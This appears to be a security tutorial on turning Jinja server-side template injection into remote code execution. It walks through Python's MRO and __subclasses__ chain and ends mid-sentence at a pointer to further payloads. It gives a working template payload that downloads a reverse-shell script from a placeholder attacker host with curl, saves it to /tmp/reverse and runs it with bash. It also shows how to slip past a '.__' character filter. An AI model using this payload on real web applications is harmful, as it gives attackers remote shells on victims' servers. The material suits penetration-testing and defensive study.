## RCE w/ Jinja templates

In our previous article on
[[server-side-template-injection#Leaking sensitive information from Jinja|server-side template injection (SSTI) attacks against Jinja]],
we only discussed leaking sensitive information using some Python builtins. That doesn't do SSTI
against Jinja must justice because we can _definitely_ gain remote code execution (RCE) with a
little bit of elbow grease.

What have to realize with Jinja is that we have access to _all_ of the Python packages, classes,
types, methods, etc. imported by the web application and currently available in the Python runtime
at time of template injection. This means we have access to things like `subprocess.Popen`, `os`,
`sys` etc.

Using the following dark magic, we can expose all classes available to us in the Python runtime
through Jinja template injection:

```python
{{ dict.mro()[-1].__subclasses__() }}
```

What do these incantations mean? `mro` stands for **Method Resolution Order (MRO)** and it's a
method inherited by every Python class that exposes the class order an object searches to find the
implementation of a method in any of its parent classes. In the snippet above, we use the
`<class 'object'>` class, always the last class in the MRO, to obtain access to all the subclasses
of the `<class 'object'>` class.

The `<class 'object'>` class is the parent of _all_ classes implemented in Python, giving us access
to all global class definitions in the current runtime. Finally, we call the special
`__subclasses__` method that gives us a reference to all the subclasses of the `<class 'object'>`
class in the current Python runtime, giving us the ability to instantiate arbitrary objects for any
class in the current runtime. More on these builtin classes can be found below:

- [MRO](https://docs.python.org/3/reference/datamodel.html#type.__mro__)
- [\_\_subclasses\_\_](https://docs.python.org/3/reference/datamodel.html#type.__subclasses__)

The following snippet is a Jinja template that uses `subprocess.Popen` to download a reverse shell
`bash` script from the attacker host to the victim host, saving it to `/tmp/reverse` and then
executing `/tmp/reverse` in `bash` to initiate a reverse shell callback to the attacker host:

```python
{% set string = "" %}
{% set class = "__class__" %}
{% set mro = "__mro__" %}
{% set subclasses = "__subclasses__" %}
{% set mro_r = string|attr(class)|attr(mro) %}
{% set subclasses_r = mro_r[-1]|attr(subclasses)() %}
{{ subclasses_r }}
{% if subclasses_r[570](["curl", "http://{ATTACKER_HOST}:{ATTACKER_PORT}/reverse", "-o", "/tmp/reverse"]) %}
	{{ subclasses_r[570](["bash", "/tmp/reverse"]) }}
{% endif %}
```

Be wary of the index reference `subclasses_r[570]` - this won't always be the same for all Python
web applications vulnerable to Jinja SSTI. Like I mentioned earlier, every time a Python web
application starts, the `__subclasses__` order _will_ change. Thus, we have to expose the entire
list of `__subclasses__` first, find the index of the `subprocess.Popen` subclass in the
`__subclasses__` list, and then use that for our follow-up RCE payload.

### Bypassing Jinja template filters

The above snippet provides an example of bypassing Jinja template filters. In our case, we were
avoiding the following bad characters:

- `.__` The Python web application would reject templates with any characters following that exact
  pattern. In order to access the `__mro__` and `__subclasses__` attributes of our `string` and
  `<class 'object'>` classes, we used the Jinja `attr` function to access class attributes and
  methods. We also used the Jinja `{%%}` directives to store the outcomes of our attribute and
  method calls.

We also use `{% if %}` and `{% endif %}` to spawn our download and execute `subprocess.Popen` calls
consecutively instead of in parallel. More or bypassing Jinja template filters, or just really good
example payloads, can be found on HackTricks:
